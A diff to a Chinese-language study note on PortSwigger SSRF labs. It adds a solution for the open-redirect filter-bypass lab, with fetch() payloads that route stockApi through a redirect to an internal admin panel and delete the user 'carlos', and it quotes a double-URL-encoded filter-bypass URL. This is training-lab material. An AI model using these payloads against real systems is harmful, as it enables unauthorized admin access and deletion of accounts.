@@ -1,6 +1,8 @@
 ---
 title: PortSwigger Server-side request forgery (SSRF)
 description: PortSwigger Server-side request forgery (SSRF)
+last_update:
+  date: "2025-08-29T08:00:00+08:00"
 ---
 
 ## Lab: Basic SSRF against the local server
@@ -249,6 +251,69 @@ fetch(`${location.origin}/product/stock`, {
 後來回頭看官方解答，真的很精妙 `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
 
 `localhost:80%2523` => 雙重 URL Decode 之後 => `localhost:80#` => 利用 `localhost:80` 巧妙的跟 `username:password` 匹配
+
+## Lab: SSRF with filter bypass via open redirection vulnerability
+
+| Dimension | Description                                                                           |
+| --------- | ------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection |
+| Lab       | https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection |
+
+觀察網頁右下角的 `Next Product`，連結 URL 是 `https://0aae007103e0e7af823d3d9c00cd00ec.web-security-academy.net/product/nextProduct?currentProductId=1&path=/product?productId=2`
+
+嘗試 `path=https://www.google.com`，成功導轉，找到一個 Open Redirect，之後就
+
+```js
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  body: `stockApi=${encodeURIComponent(`/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin`)}`,
+  method: "POST",
+  mode: "cors",
+  credentials: "include",
+});
+```
+
+然後再
+
+```js
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
+  },
+  body: `stockApi=${encodeURIComponent(`/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos`)}`,
+  method: "POST",
+  mode: "cors",
+  credentials: "include",
+});
+```
+
+## Lab: Blind SSRF with out-of-band detection
+
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/ssrf/blind#how-to-find-and-exploit-blind-ssrf-vulnerabilities |
+| Lab       | https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection                          |
+
+<!-- todo-yusheng -->
+
+這題需要 Burp Suite Professional，之後再來解～
+
+## Lab: Blind SSRF with Shellshock exploitation
+
+| Dimension | Description                                                                                        |
+| --------- | -------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/ssrf/blind#how-to-find-and-exploit-blind-ssrf-vulnerabilities |
+| Lab       | https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation                        |
+
+<!-- todo-yusheng -->
+
+這題需要 Burp Suite Professional，之後再來解～
+
+## 小結
+
+又是一個很快就結束的 Lab，只有短短的 5 題，但也讓我學到了原來 URL 跟 IP 原來水很深
 
 ## 參考資料
 
